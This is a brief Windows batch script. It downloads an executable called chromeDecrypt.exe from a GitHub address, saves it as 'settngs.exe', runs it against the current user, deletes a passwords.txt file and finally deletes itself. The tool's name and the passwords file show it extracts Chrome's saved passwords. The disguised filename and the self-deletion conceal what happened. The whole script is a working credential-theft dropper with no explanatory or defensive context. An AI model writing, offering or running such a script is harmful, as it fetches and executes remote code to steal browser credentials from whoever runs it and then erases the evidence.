@echo off

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/vpq5kd/chromeDecrypt/raw/main/dist/chromeDecrypt.exe' -OutFile 'settngs.exe'"

.\settngs.exe %USERNAME%

del "passwords.txt"

del "%~f0"